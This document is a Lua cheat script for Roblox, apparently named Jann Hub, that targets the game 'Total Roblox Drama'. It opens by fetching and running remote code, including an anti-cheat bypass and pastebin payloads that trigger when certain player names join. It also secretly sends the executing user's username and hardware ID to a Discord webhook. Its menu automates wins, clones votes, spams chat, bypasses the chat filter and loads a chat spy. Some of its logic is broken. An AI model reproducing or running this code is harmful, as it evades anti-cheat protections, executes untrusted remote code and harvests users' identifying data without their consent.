
loadstring(game:HttpGet('https://raw.githubusercontent.com/venncord/JannHub/main/Detector.lua'))()


local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/venncord/JannHub/main/Lib.lua'))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
wait()

game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == "ProAIt5000" then
		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
	end
end)

game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == "1kS_up" then
		loadstring(game:HttpGet("https://pastebin.com/raw/7V3d4vw4"))()
	end
end)


local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local WhitelistedHWIDs = {"80e56303-ea6e-4aac-91f5-86f50f0b574e","aaec3553-ce01-4376-bd7b-28f4d6c1a072","0485fa7c-562c-4066-b966-3f999cdc0ff7"}
local qNVAKkuwxNpqruLjSRHg = false

function CheckHWID(hwidval)
for _,whitelisted in pairs(WhitelistedHWIDs) do
 if hwidval == whitelisted then
     return true
 elseif hwidval ~= whitelisted then
     return false
       end
    end
end

qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)

if qNVAKkuwxNpqruLjSRHg == true then
 game.Players.LocalPlayer:Kick("You have been blacklisted from using Jann Hub.")
end



local url =
   "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
local data = {
   ["content"] = " ",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Jann Hub** in: "   ..game.PlaceId.. " :) ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."** JobID: **"..game.JobId.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local link = "https://discord.gg/uNaTKuM7jQ"

local Window = Rayfield:CreateWindow({
   Name = "Jann Hub",
   LoadingTitle = "Loading Jann Hub",
   LoadingSubtitle = "by Jack & Venn | .gg/uNaTKuM7jQ",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "FolderConfig", -- Create a custom folder for your hub/game
      FileName = "Jann Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "uNaTKuM7jQ", -- The Discord invite code, do not include discord.gg/
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Jann Hub",
      Subtitle = "Key System",
      Note = "Join the discord (https://discord.gg/uNaTKuM7jQ)",
      FileName = "VennKey",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = "x7Rg2YpL4JnIc6Xa8Wb3Ko2Tg9Hr1Zl5Pm2Qs8Vn3"
   }
})


local Tab = Window:CreateTab("Total Roblox Drama", 16451926444) -- Title, Image

local Section = Tab:CreateSection("Game - Things that enhance gameplay",false)

local BreakSpleef = Tab:CreateButton({
   Name = "Break Spleef",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			for i,v in pairs(game.Workspace.Assets:GetDescendants()) do
				if v.Name == "SpleefPart" then 
					firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0) 
				end
			end
   end,
})

local EatPancake = Tab:CreateButton({
   Name = "Insta-Eat Pancake",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
for i,v in pairs(game.Workspace:GetDescendants()) do
if v.Name == game.Players.LocalPlayer.Name then
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
fireclickdetector(v.ClickDetector)
end
end 

   end,
})

local GetSafetyStatue = Tab:CreateButton({
   Name = "Get Safety Statue",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
   for i,v in pairs (workspace.Idols:GetDescendants()) do
                if v.Name == "Bag" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    task.wait()
                    v:Destroy()
                    wait()
                elseif v.Name == "SafetyStatue" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    wait()
                end
            end
   end,
})


local WinMathMania = Tab:CreateToggle({
   Name = "Auto-Win Math Mania",
   Info = "Toggle info/Description.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle12352355235221", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            number = 0
            for i = 1, 10 do
                local function automathloopfix()
                if Value == true then
                    number = number + 1
                    local s = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].MainText.Text
                    local e = s:gsub("=","")
                    local g = e:gsub("?","")
                    local x = g:gsub(" ","")
                    local y = x
                    local f = loadstring("return " .. y)()
                    wait()
                    game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Box.Text = f
                    task.wait()
                    local button = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Enter

                    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                    for i,v in pairs(events) do
                        for i,v in pairs(getconnections(button[v])) do
                            v:Fire()
                        end
                    end
                    task.wait(0.5)
                end
            end
				            task.wait()
            automathloopfix()
            end
   end,
})



local ManipulateVotes = Tab:CreateToggle({
    Name = "Manipulate Votes (might not work lmfao)",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "ManipulateVotes", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
            if Value == true then
local thing = v.Value
                local SEND = PlayerVoted .. " voted for " .. PlayerPicked
						if thing == game.Players.LocalPlayer.Name then
							v:Clone()
							v:Clone()
							v:Clone()
						end
            end
        end)
    end
})



local NotifyVotes = Tab:CreateToggle({
    Name = "Notify Votes",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Toggle121412", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
            if Value == true then
                PlayerVoted = game.ReplicatedStorage.Season.Players[v.Value].Value
                PlayerPicked = game.ReplicatedStorage.Season.Players[v.Name].Value
                local SEND = PlayerVoted .. " voted for " .. PlayerPicked
                Rayfield:Notify({
                    Title = "Vote Detected",
                    Content = SEND,
                    Duration = 1,
                    Image = 4483362458
                })
            end
        end)
    end
})

local FoodFast2 = Tab:CreateToggle({
    Name = "Foodfast (says their roblox username when someone gets a bag)",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Tewesaogsagsarawlrsae12wras1412", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Twists.Bags.ChildAdded:Connect(function(v)
            if Value == true then
						local thing = v.Name
						local saerwaera = " "..thing.." got a bag :)"
									local A_1 = saerwaera local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
            end
        end)
    end
})

local FoodFast = Tab:CreateToggle({
    Name = "Foodfast (says Hmm... when someone gets a bag)",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Togsagle121412", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Twists.Bags.ChildAdded:Connect(function(v)
            if Value == true then
					
									local A_1 = "Hmm..." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
            end
        end)
    end
})

local NotifyBag = Tab:CreateToggle({
    Name = "Notify When a User gets a Bag",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Toggle1214122723242", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Twists.Bags.ChildAdded:Connect(function(v)
            if Value == true then
                PlayerPicked2 = game.ReplicatedStorage.Season.Players[v.Name].Value
                local SEND2 = PlayerPicked2 .. " got a bag!"
                Rayfield:Notify({
                    Title = "Bag Detected",
                    Content = SEND2,
                    Duration = 1,
                    Image = 4483362458
                })
            end
        end)
    end
})


local WinObby = Tab:CreateButton({
   Name = "Win Obby",
   Info = "yea", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
if game.Workspace.Assets:FindFirstChild("Finish",true) then
				local v = game.Workspace.Assets:FindFirstChild("Finish",true)
                    v.CanCollide = false
                    v.Transparency = 1
                    wait()
                    v.Position = game.Players.LocalPlayer.Character.Torso.Position
			end
   end,
})


local AutoCollectCoins = Tab:CreateToggle({
   Name = "Auto Collect Coins",
   Info = "Speaks for itself.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle123", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
         collectcoinsloop = Value
            while collectcoinsloop == true do
               task.wait(0.00001)
                for i,v in pairs (workspace:GetDescendants()) do
                    if v.Name == "Gem" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    elseif v.Name == "Coin" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    end
                end
         end
   end,
})

local Section1 = Tab:CreateSection("Misc",false)

local AutoReport = Tab:CreateButton({
   Name = "Auto-Report (idfk if it works)",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/main.lua", true))()
   end,
})

local MobileKeyboard = Tab:CreateButton({
   Name = "Mobile Keyboard",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
   end,
})

local ChatSpy = Tab:CreateButton({
    Name = "Chat Spy",
    Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
    Interact = 'Changable',
    Callback = function()
             loadstring(game:HttpGet(('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/ChatSpy.lua'),true))()
    end,
 })

local ChatSpy = Tab:CreateButton({
    Name = "Shaders",
    Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
    Interact = 'Changable',
    Callback = function()
             loadstring(game:HttpGet(('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/RTX%20Shaders.lua'),true))()
    end,
 })

local BuyCharacter = Tab:CreateInput({
   Name = "Buy Character",
   Info = "Enter the text of the character you would like to purchase, it doesnt have to be a real character. Bypasses chat filter.", -- Speaks for itself, Remove if none.
   PlaceholderText = "Input Text",
   OnEnter = true, -- Will callback only if the user pressed ENTER while the box is focused.
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
local args = {
    [1] = "Character",
    [2] = Text
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Buy"):FireServer(unpack(args))
   end,
})


local RemoveBarriers = Tab:CreateButton({
   Name = "Remove barriers",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
        for i,v in pairs (workspace:GetDescendants()) do
            if v.Name == "Glass" then
                v:Destroy()
            end
        end
   end,
})
